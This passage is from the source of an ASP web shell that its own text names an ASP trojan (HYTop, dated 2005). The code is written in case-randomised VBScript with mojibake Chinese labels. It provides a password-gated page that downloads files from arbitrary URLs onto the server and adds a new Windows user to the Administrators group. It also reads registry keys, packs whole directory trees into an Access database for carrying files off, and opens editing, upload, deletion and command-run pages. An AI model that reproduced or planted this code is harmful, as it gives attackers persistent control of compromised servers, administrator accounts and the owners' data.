           SHOWTItlE("Ò»Ð©ÁãËéµÄÐ¡¶«Î÷")
           seLecT Case theAct
               Case "downFromUrl"
                   downFromUrl()
                   RESpONsE.EnD
               Case "addUser"
                   AddUser REqUEst("userName"), rEquEst("passWord")
                   RESPOnSe.eNd
               Case "readReg"
                   readReg()
                   RespOnSe.end
           END selECT
           echo "ÊýÖÆ×ª»»:<hr/>"
           EChO "<iNpUT naMe=text1 vAluE=×Ö·ûºÍÊý×Ö×ª10ºÍ16½øÖÆ size=25 ID=text9>"
           eCho "<InPUT TYpE=ButTON oNClIcK=main(); vAlUe=¸øÎÒ×ª>"
           EcHO "<InpUt vALUE=16½øÖÆ×ª10½øÖÆºÍ×Ö·û size=25 id=vars>"
           eCho "<INpuT tYPe=ButTon OncLICK=main2(); vAlUE=¸øÎÒ×ª>"
           eChO "<hr/>"

           echo "ÏÂÔØµ½·þÎñÆ÷:<hr/>"
           eCHO "<foRM MetHod=post target=_blank>"
           eChO "<Input NAmE=theUrl vaLUe='http://' size=80><Input TYpE=submit VAlue=' ÏÂÔØ '><Br/>"
           echO "<INPUT NaMe=thePath VAlue=""" & HtmlEncode(Server.maPPAtH(".")) & """ size=80>"
           eChO "<inPuT tyPe=checkbox NAMe=overWrite VALue=2>´æÔÚ¸²¸Ç"
           ECHo "<InpuT tYpe=hIDDEn valuE=downFromUrl nAme=theAct>"
           EcHo "</fOrm>"
           echo "<hr/>"

           eCHO "ÎÄ¼þ±à¼:<hr/>"
           ECHo "<foRm mEThOd=PosT action='?' target=_blank>"
           ECHO "<inPUT size=80 name=thePath vAluE=""" & HtmlEncode(reQueST.servERVaRIaBLEs("PATH_TRANSLATED")) & """>"
           eCho "<iNpUT tyPe=HIDDEn vALUE=showEdit nAmE=theAct>"
           eChO "<SELeCT NAME=pageName><optIon valuE=AppFileExplorer>ÓÃStream</oPtioN><OpTiON VaLUE=FsoFileExplorer>ÓÃFSO</oPTIon></seleCt>"
           echo "<iNput TYPE=submit valuE=' ´ò¿ª '>"
           Echo "</FOrm><hr/>"

           echo "¹ÜÀíÕÊºÅÌí¼Ó(³É¹¦ÂÊ¼«µÍ):<hr/>"
           eCHO "<fORm metHoD=pOST target=_blank>"
           echo "<INpUt TypE=HIDdEn vALue=addUser NaME=theAct>"
           ECHO "<InPuT naME=userName VAluE='HYTop' size=39>"
           EChO "<inpUt naMe=passWord TYpE=password vaLUe='HYTop' size=39>"
           ECHo "<inPuT type=submit vAlUE=' Ìí¼Ó '>"
           ECHO "</foRM><hr/>"

           ECho "×¢²á±í¼üÖµ¶ÁÈ¡(<a href=javascript:showHideMe(regeditInfo);>×ÊÁÏ</a>):<hr/>"
           eCHO "<form metHod=poSt target=_blank>"
           eCHO "<InpUt tyPe=HIDDen vaLue=readReg namE=theAct>"
           EcHo "<INpuT NAmE=thePath vaLUE='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
           ecHo "<iNpUT tYPe=submit VaLuE=' ¶ÁÈ¡ '>"
           ECho "<span id=regeditInfo style='display:none;'><hr/>"
           eChO "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {²»ÏÔÊ¾ÉÏ´ÎµÇÂ¼ÓÃ»§}<bR/>"
           ecHO "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=È±Ê¡,1=ÄäÃûÓÃ»§ÎÞ·¨ÁÐ¾Ù±¾»úÓÃ»§ÁÐ±í,2=ÄäÃûÓÃ»§ÎÞ·¨Á¬½Ó±¾»úIPC$¹²Ïí}<BR/>"
           eCho "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {½ûÖ¹Ä¬ÈÏ¹²Ïí}<Br/>"
           eCHO "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {¹Ø±ÕÍøÂç¹²Ïí}<br/>"
           ECHo "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {ÆôÓÃTCP/IPÉ¸Ñ¡(ËùÓÐÊÔÅäÆ÷)}<Br/>"
           echO "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {ÔÊÐíIPÂ·ÓÉ}<BR/>"
           eChO "-------ÒÔÏÂËÆºõÒª¿´°ó¶¨µÄÍø¿¨,²»ÖªµÀÊÇ·ñ×¼È·---------<br/>"
           eCho "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {Ä¬ÈÏÍø¹Ø}<Br/>"
           echO "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {Ê×DNS}<BR/>"
           EcHo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {ÔÊÐíµÄTCP/IP¶Ë¿Ú}<bR/>"
           Echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {ÔÊÐíµÄUDP¶Ë¿Ú}<Br/>"
           ECHo "-----------OVER--------------------<Br/>"
           eCho "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {¹²¼¸¿é»î¶¯Íø¿¨}<Br/>"
           Echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {µ±Ç°Íø¿¨µÄÐòÁÐ(°ÑÉÏÃæµÄÌæ»»)}<Br/>"
           EchO "==========================================================<br/>ÒÔÉÏ×ÊÁÏÓÉkEvin1986Ìá¹©"
           EChO "</span>"
           EcHO "</foRM><hr/>"

           eCHO "<script LANgUAGE=vbs>" & vbNewLine
           echO "sUb main()" & vbNewLine
           EchO "base=document.all.text9.VALue" & vbNewLine
           echo "If IsNumeric(base) tHEN" & vbNewLine
           ecHo "cc=hex(cstr(base))" & vbNewLine
           eCHo "alert(""10½øÖÆÎª""&base)" & vbNewLine
           EcHO "alert(""16½øÖÆÎª""&cc)" & vbNewLine
           ECho "exit suB" & vbNewLine
           EChO "end if" & vbNewLine
           echo "aa=asc(cstr(base))" & vbNewLine
           eCHO "bb=hex(aa)" & vbNewLine
           EchO "alert(""10½øÖÆÎª""&aa)" & vbNewLine
           EChO "alert(""16½øÖÆÎª""&bb)" & vbNewLine
           EcHo "eND Sub" & vbNewLine
           ECho "suB main2()" & vbNewLine
           eChO "If document.all.vars.VaLue<>"""" tHeN" & vbNewLine
           eCho "dIM nums,tmp,tmpstr,i" & vbNewLine
           EcHO "nums=document.all.vars.vALuE" & vbNewLine
           ECHO "nums_len=Len(nums)" & vbNewLine
           eChO "For i=1 To nums_len" & vbNewLine
           ecHO "tmp=mId(nums,i,1)" & vbNewLine
           EcHo "If IsNumeric(tmp) then" & vbNewLine
           eCHo "tmp=tmp * 16 * (16^(nums_len-i-1))" & vbNewLine
           EChO "Else" & vbNewLine
           ECHo "If ASC(UCase(tmp))<65 oR ASC(UcAse(tmp))>70 ThEn" & vbNewLine
           EChO "alert(""ÄãÊäÈëµÄÊýÖµÖÐÓÐ·Ç·¨×Ö·û£¬16½øÖÆÊýÖ»°üÀ¨1¡«9¼°a¡«fÖ®¼äµÄ×Ö·û£¬ÇëÖØÐÂÊäÈë¡£"")" & vbNewLine
           EcHO "exit SUB" & vbNewLine
           EChO "EnD If" & vbNewLine
           eCHO "tmp=(ASC(UcASE(tmp))-55) * (16^(nums_len-i))" & vbNewLine
           ECHo "eNd If" & vbNewLine
           EChO "tmpstr=tmpstr+tmp" & vbNewLine
           EcHO "Next" & vbNewLine
           ECHO "alert(""×ª»»µÄ10½øÖÆÎª:""&tmpstr&""Æä×Ö·ûÖµÎª:""&chr(tmpstr))" & vbNewLine
           echO "eNd If" & vbNewLine
           EcHO "EnD sub" & vbNewLine
           EcHO "</script>" & vbNewLine
           ECho "Powered By Marcos 2005.02"
       EnD SUB
       SUb downFromUrl()
           If isDebugMode = False THeN
               On Error Resume Next
           ENd If
           Dim Http, theUrl, thePath, stream, fileName, overWrite
           theUrl = REQueSt("theUrl")
           thePath = ReQuesT("thePath")
           overWrite = REquest("overWrite")
           Set stream = Server.CreAtEobJEct("ADOdB.Stream")
           Set Http = Server.crEateOBJECT("MSXML2.XMLHTTP")

           If overWrite <> 2 tHEn
               overWrite = 1
           eND If

           Http.Open "GET", theUrl, False
           Http.Send()
           If Http.ReadyState <> 4 tHeN
               Exit suB
           END If

           With stream
               .TypE = 1
               .Mode = 3
               .Open
               .Write Http.ResponseBody
               .Position = 0
               .SaveToFile thePath, overWrite
               If Err.Number = 3004 tHeN
                   Err.cLEAr
                   fileName = spLIt(theUrl, "/")(uboUnD(spLit(theUrl, "/")))
                   If fileName = "" THeN
                       fileName = "index.htm.txt"
                   end If
                   thePath = thePath & "\" & fileName
                   .SaveToFile thePath, overWrite
               eND If
               .Close
           END With
           chkErr(Err)

           alertThenClose("ÎÄ¼þ " & Replace(thePath, "\", "\\") & " ÏÂÔØ³É¹¦!")

           Set Http = Nothing
           Set Stream = Nothing
       end SuB
       Sub AddUser(strUser, strPassword)
           If isDebugMode = False ThEn
               On Error Resume Next
           eND If
           dIm computer, theUser, theGroup
           Set computer = Getobject("WinNT://.")
           Set theGroup = GetObject("WinNT://./Administrators,group")

           Set theUser = computer.Create("User", strUser)
           theUser.SetPassword(strPassword)
           chkErr(Err)
           theUser.SetInfo
           chkErr(Err)
           theGroup.Add theUser
           chkErr(Err)

           Set theUser = Nothing
           Set computer = Nothing
           Set theGroup = Nothing

           eCHO getUserInfo(strUser)
       End SUB
       sUb readReg()
           If isDebugMode = False thEn
               On Error Resume Next
           ENd If
           dIm i, thePath, theArray
           thePath = rEquest("thePath")
   '       EchO thePath & "<bR/>"
           theArray = wsX.RegRead(thePath)
           If IsArray(theArray) ThEN
               For i = 0 To UBoUNd(theArray)
                   EcHo "<li>" & theArray(i)
               Next
            Else
               EcHo "<li>" & theArray
           end If
           chkErr(Err)
       End Sub
       SUB PageAddToMdb()
           dIM theAct, thePath
           theAct = ReQUESt("theAct")
           thePath = rEQUESt("thePath")
           Server.ScriptTimeOut = 5000
           shOwTiTlE("ÎÄ¼þ¼Ð´ò°ü/½â¿ªÆ÷")
           If theAct = "addToMdb" ThEn
               addToMdb(thePath)
               alertThenClose("²Ù×÷Íê³É!")
               ResPONSE.ENd
           End If
           If theAct = "releaseFromMdb" ThEn
               unPack(thePath)
               alertThenClose("²Ù×÷Íê³É!")
               RESPOnse.ENd
           enD If
           ECho "ÎÄ¼þ¼Ð´ò°ü:<bR/>"
           Echo "<FORM methOd=PoST target=_blank>"
           EChO "<InPUT nAmE=thePath ValUe=""" & HtmlEncode(Server.mAppaTh(".")) & """ size=80>"
           echo "<input tYPE=HiDDeN vaLUe=addToMdb name=theAct>"
           ECHo "<sElecT NAmE=theMethod><optIOn valUe=fso>FSO</OpTiON><optIon vAluE=app>ÎÞFSO</OPtion>"
           eCHo "</SELeCT>"
           eCHO "<Br><InpuT tYPe=submit vaLUe='¿ªÊ¼´ò°ü'>"
           ecHo "<hr/>×¢: ´ò°üÉú³ÉHYTop.mdbÎÄ¼þ,Î»ÓÚº£ÑôÄ¾ÂíÍ¬¼¶Ä¿Â¼ÏÂ"
           EChO "</forM>"
           eCHo "<hr/>ÎÄ¼þ°ü½â¿ª(ÐèFSOÖ§³Ö):<Br/>"
           eChO "<FOrM MEtHOD=poSt target=_blank>"
           ECHO "<INpUT naME=thePath vaLue=""" & HtmlEncode(Server.mAppatH(".")) & "\HYTop.mdb"" size=80>"
           ECho "<INput type=hiDDen valuE=releaseFromMdb NamE=theAct><input tyPe=submit VALUE='°ïÎÒ½â¿ª'>"
           EcHO "<hr/>×¢: ½â¿ªÀ´µÄËùÓÐÎÄ¼þ¶¼Î»ÓÚº£ÑôÄ¾ÂíÍ¬¼¶Ä¿Â¼ÏÂ"
           eChO "</FoRM>"
           ECHO "<hr/>Powered By Marcos 2005.02"
       EnD sUB
       SuB addToMdb(thePath)
           If isDebugMode = False THEn
               On Error Resume Next
           end If
           Dim rs, conn, stream, connStr, adoCatalog
           Set rs = Server.cReaTeoBject("AdODB.RecordSet")
           Set stream = Server.CREaTeOBJect("adodb.Stream")
           Set conn = Server.crEatEObject("aDoDB.Connection")
           Set adoCatalog = Server.creatEobjeCt("ADOX.Catalog")
           connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.maPPatH("HYTop.mdb")
           adoCatalog.Create connStr
           conn.Open connStr
           conn.Execute("Create TAbLe FileData(ID int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")

           stream.Open
           stream.TypE = 1
           rs.Open "FileData", conn, 3, 3

           If REqUeSt("theMethod") = "fso" thEn
               fsoTreeForMdb thePath, rs, stream
            Else
               saTreeForMdb thePath, rs, stream
           EnD If
           rs.Close
           Conn.Close
           stream.Close
           Set rs = Nothing
           Set conn = Nothing
           Set stream = Nothing
           Set adoCatalog = Nothing
       end SUB
       Function fsoTreeForMdb(thePath, rs, stream)
           Dim item, theFolder, folders, files, sysFileList
           sysFileList = "$HYTop.mdb$HYTop.ldb$"
           If fsoX.FolderExists(thePath) = False tHen
               showErr(thePath & " Ä¿Â¼²»´æÔÚ»òÕß²»ÔÊÐí·ÃÎÊ!")
           end If
           Set theFolder = fsoX.GetFolder(thePath)
           Set files = theFolder.Files
           Set folders = theFolder.SubFolders
           For eacH item In folders
               fsoTreeForMdb item.Path, rs, stream
           Next
           For eACH item In files
               If InsTr(sysFileList, "$" & item.namE & "$") <= 0 tHEN
                   rs.AddNew
                   rs("thePath") = mid(item.Path, 4)
                   stream.LoadFromFile(item.Path)
                   rs("fileContent") = stream.Read()
                   rs.Update
               enD If
           Next
           Set files = Nothing
           Set folders = Nothing
           Set theFolder = Nothing
       END Function
       sub unPack(thePath)
           If isDebugMode = False tHEn
               On Error Resume Next
           end If
           Server.ScriptTimeOut = 5000
           diM rs, wS, str, conn, stream, connStr, theFolder
           str = Server.MApPaTh(".") & "\"
           Set rs = CreatEOBjecT("aDoDB.RecordSet")
           Set stream = CREaTEObJEcT("AdODb.Stream")
           Set conn = CrEaTeobjeCT("ADODB.Connection")
           connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
           conn.Open connStr
           rs.Open "FileData", conn, 1, 1
           stream.Open
           stream.tYPE = 1
           Do Until rs.Eof
               theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
               If fsoX.FolderExists(str & theFolder) = False THeN
                   createFolder(str & theFolder)
               EnD If
               stream.SetEos()
               stream.write rs("fileContent")
               stream.SaveToFile str & rs("thePath"), 2
               rs.MoveNext
           Loop
           rs.Close
           conn.Close
           stream.Close
           Set ws = Nothing
           Set rs = Nothing
           Set stream = Nothing
           Set conn = Nothing
       End sUB
       suB createFolder(thePath)
           diM i
           i = insTr(thePath, "\")
           Do While i > 0
               If fsoX.FolderExists(LeFT(thePath, i)) = False tHEn
                   fsoX.CreateFolder(Left(thePath, i - 1))
               End If
               If iNstr(mId(thePath, i + 1), "\") tHEN
                   i = i + InStR(MiD(thePath, i + 1), "\")
                Else
                   i = 0
               enD If
           Loop
       End sUB
       SuB saTreeForMdb(thePath, rs, stream)
           dIM item, theFolder, sysFileList
           sysFileList = "$HYTop.mdb$HYTop.ldb$"
           Set theFolder = saX.NameSpace(thePath)

           For eAcH item In theFolder.Items
               If item.IsFolder = True ThEn
                   saTreeForMdb item.Path, rs, stream
                Else
                   If INSTR(sysFileList, "$" & item.NAMe & "$") <= 0 theN
                       rs.AddNew
                       rs("thePath") = mID(item.Path, 4)
                       stream.LoadFromFile(item.Path)
                       rs("fileContent") = stream.Read()
                       rs.Update
                   eNd If
               end If
           Next
           Set theFolder = Nothing
       eND Sub
       sub pAGelogin()
           DIm theAct, passWord
           theAct = reQueST("theAct")
           passWord = REqUEST("userPassword")

           ShowtItlE("¹ÜÀíµÇÂ¼")

           If theAct = "chkLogin" THen
               If passWord = userPassword THEn
                   seSsiOn(m & "userPassword") = passWord
                   reDIReCTto("?pageName=PageList")
                Else
                   eCho "<script LanGuAge=javascript>alert('°¡Å¶,µÇÂ¼Ê§°ÜÁË...');history.BaCK();</script>"
               eNd If
           END If

           EcHo "<style>bodY{margin:8;text-aLIGN:cEnTer;}</style>"
           echo "º£Ñô¶¥¶ËÍøASPÄ¾Âí@2006<hr/>"
           ecHO "<bOdY onload=document.forms[0].userPassword.focus();>"
           echo "<FORm meThOd=pOsT OnSuBMIT=this.Submit.disabled=true;>"
           echo "<INpuT nAmE=userPassword ClasS=INpUt TYpE=password size=30> "
           eChO "<input TYpE=hidDen Name=theAct VAluE=chkLogin>"
           eCHO "<INpUt TyPE=submit nAME=Submit vALUE=""" & HtmlEncode(myName) & """ clAsS=iNPut>"
           ecHo "<hr/>"
           EcHo "±¾°æ¸ÐÐ»: Kevin,×¢²á±í¸÷¼üÖµµÄÊÕ¼¯¹¤×÷"
           EcHo "<BR/>WWW.HAIYANGTOP.NeT,WWW.HIDIDI.net 2005.02"
           ECHo "</FOrm>"
           EcHo "<bOdY>"
       END sub
       SUB pAGEOtHeR()
           echO "<style>"
           eCHo "A:visited {color: #333333;text-decoration: none;}"
           ecHo "A:active {color: #333333;text-decoration: none;}"
           eCho "A:link {color: #000000;text-decoration: none;}"
           EcHo "A:hover {color: #333333;text-decoration: none;}"
           EChO "boDY {font-size: 9pt;COLOR: #000000;font-family: ""Courier New"";border: none;background-color: buttonface;}"
           EChO "textarea {font-family: ""Courier New"";font-size: 12px;border-WidtH: 1px;color: #000000;}"
           echO "tABLe {font-size: 9pt;}"
           eCHo "form {margin: 0;}"
           eChO "#fsoDriveList span{Width: 100px;}"
           EcHO "#FileList span{wiDth: 90;HEIGHt: 70;cursor: hand;text-aLiGn: CENtEr;word-break: break-all;border: 1px solid buttonface;}"
           eCHO ".anotherSpan{color: #ffffff;WidtH: 90;heIGhT: 70;text-aliGN: ceNteR;background-color: #0A246A;border: 1px solid #0A246A;}"
           ecHo ".font{font-size: 35px;line-hEIgHT: 40px;}"
           ECho "#fileExplorerTools {background-color: buttonFace;}"
           eCho ".inPUT, inPUt {border-WIdTh: 1px;}"
           ECho "</style>" & vbNewLine

           ECHo "<script languaGe=javascript>" & vbNewLine
           eCHo "function showHideMe(me){" & vbNewLine
           eCHo "if(me.innerText == ''){" & vbNewLine
           EchO "me.innerText = '\nNo Contents!';" & vbNewLine
           ECho "}" & vbNewLine
           ECHO "if(me.style.display == 'none'){" & vbNewLine
           ECHO "me.style.display = '';" & vbNewLine
           EChO "}else{" & vbNewLine
           EChO "me.style.display = 'none';" & vbNewLine
           eCHO "}" & vbNewLine
           ECHO "}" & vbNewLine
           eChO "function changeMyClass(me){" & vbNewLine
           eCho "if(me.className == ''){" & vbNewLine
           ECHo "if(usePath.vaLUe != '')document.getElementById(usePath.VAlUe).className = '';" & vbNewLine
           eChO "usePath.valuE = me.Id;" & vbNewLine
           ECHo "status = me.TiTle;" & vbNewLine
           EchO "me.className = 'anotherSpan';" & vbNewLine
           ECHO "}" & vbNewLine
           echo "}" & vbNewLine
           eCHo "function changeThePath(me){" & vbNewLine
           echO "location.href = '?pageName=' + pageName.VALue + '&thePath=' + me.Id;" & vbNewLine
           ecHo "}" & vbNewLine
           eCho "function fixTheLayer(strObj){" & vbNewLine
           echo "var objStyle=document.getElementById(strObj).style;" & vbNewLine
           ECHO "objStyle.wiDth = document.BoDy.clientWidth;" & vbNewLine
           ECho "objStyle.top = document.BoDY.scrollTop + 2;" & vbNewLine
           eChO "}" & vbNewLine
           EcHo "function openUrl(){" & vbNewLine
           eChO "newWin = window.open('?pageName=' + pageName.VaLue + '&theAct=openUrl&thePath=' + usePath.vALuE);" & vbNewLine
           ecHo "}" & vbNewLine
           EChO "function newOne(){" & vbNewLine
           echO "newWin = window.open('?pageName=' + pageName.VALUe + '&theAct=newOne&thePath=' + truePath.VaLuE, '', 'menu=no,resizable=yes,heiGHt=110,wIdtH=300');" & vbNewLine
           echo "}" & vbNewLine
           ECHO "function editFile(){" & vbNewLine
           ecHo "newWin = window.open('?pageName=' + pageName.vAluE + '&theAct=showEdit&thePath=' + usePath.VALuE, '', 'menu=no,resizable=yes');" & vbNewLine
           Echo "}" & vbNewLine
           EcHo "function appDoAction(act){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.vAlue + '&theAct=' + act + '&thePath=' + usePath.vaLUe, '', 'menu=no,resizable=yes,HEigHT=100,wIDTH=368');" & vbNewLine
           EchO "}" & vbNewLine
           EcHO "function DoWNTheFiLE(){" & vbNewLine
           eChO "if(confirm('Èç¹û¸ÃÎÄ¼þ³¬¹ý20M,\n½¨Òé²»ÒªÍ¨¹ýÁ÷·½Ê½ÏÂÔØ\nÕâÑù»áÕ¼ÓÃ·þÎñÆ÷´óÁ¿µÄ×ÊÔ´\n²¢¿ÉÄÜµ¼ÖÂ·þÎñÆ÷ËÀ»ú!\nÄú¿ÉÒÔÏÈ°ÑÎÄ¼þ¸´ÖÆµ½µ±Ç°Õ¾µãÄ¿Â¼ÏÂ,\nÈ»ºóÍ¨¹ýhttpÐÒéÀ´ÏÂÔØ.\n°´\""È·¶¨\""ÓÃÁ÷À´½øÐÐÏÂÔØ.')){" & vbNewLine
           EchO "newWin = window.open('?pageName=' + pageName.VAlUe + '&theAct=DOwnThEfilE&thePath=' + usePath.vaLUE, '', 'menu=no,resizable=yes,hEiGhT=100,WidTH=368');" & vbNewLine
           EChO "}" & vbNewLine
           ECHo "}" & vbNewLine
           echo "function appDoAction2(act){" & vbNewLine
           ECHO "newWin = window.open('?pageName=' + pageName.vALuE + '&theAct=' + act + '&thePath=' + truePath.VALue, '','menu=no,resizable=yes,heIgHT=100,wIDTH=368');" & vbNewLine
           eCHO "}" & vbNewLine
           echo "function appTheAttributes(){" & vbNewLine
           eCho "newWin = window.open('?pageName=' + pageName.vALuE + '&theAct=theAttributes&thePath=' + usePath.VALue, '', 'menu=no,resizable=yes,hEIGht=194,WiDTH=368');" & vbNewLine
           eChO "}" & vbNewLine
           ecHo "function appRename(){" & vbNewLine
           eCHO "newWin = window.open('?pageName=' + pageName.Value + '&theAct=rename&thePath=' + usePath.valUe, '', 'menu=no,resizable=yes,HeIgHt=100,wiDTh=368');" & vbNewLine
           echO "}" & vbNewLine
           eCHo "function upTheFile(){" & vbNewLine
           EchO "newWin = window.open('?pageName=' + pageName.valUe + '&theAct=showUpload&thePath=' + truePath.VALuE, '', 'menu=no,resizable=yes,hEIGhT=80,WiDth=380');" & vbNewLine
           ECHO "}" & vbNewLine
           echO "function wsLoadIFrame(){" & vbNewLine
           eChO "cmdResult.location.href = '?pageName=SaCmdRun&theAct=readResult';" & vbNewLine
           echo "}" & vbNewLine
           eCho "function fsoRename(){" & vbNewLine
           ecHo "newWin = window.open('?pageName=' + pageName.vALue + '&theAct=showFsoRename&thePath=' + usePath.vAlUe, '', 'menu=no,resizable=yes,heiGHT=20,WIDTH=300');" & vbNewLine
           ECho "}" & vbNewLine
           EcHO "function delOne(){" & vbNewLine
           ECHO "newWin = window.open('?pageName=' + pageName.valuE + '&theAct=delOne&thePath=' + usePath.VALUe, '', 'menu=no,resizable=yes,HeiGht=100,WIDth=368');" & vbNewLine
           ecHo "}" & vbNewLine
           eChO "function fsoGetAttributes(){" & vbNewLine
           eCHo "newWin = window.open('?pageName=' + pageName.VAlUe + '&theAct=getAttributes&thePath=' + usePath.VALue, '', 'menu=no,resizable=yes,heIGhT=170,wiDth=300');" & vbNewLine
           ECHo "}" & vbNewLine
           ecHo "</script>"
       eND sUB
   %>
